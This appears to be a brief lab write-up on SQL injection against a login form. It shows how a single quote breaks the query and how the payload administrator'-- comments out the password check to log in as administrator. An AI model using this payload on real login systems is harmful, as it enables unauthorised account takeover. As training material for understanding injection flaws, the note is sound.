Sql Injection - Login Functionalty.

End Goal : perform Sql Injection attack and log in as administrator user.

Analysis :

    SELECT FirstName FROM users where username= 'admin' and password= 'admin'

    SELECT FirstName FROM users where username= ''' and password= 'admin'
        when we put ' in username it closes the brackets and leave the other bracket ' with rest of query
        leading to server error - the goal is to login with only username and ignore password.

    SELECT FirstName FROM users where username= 'administrator'--' and password= 'admin'
        means login with admin and ignore the rest by using -- comments
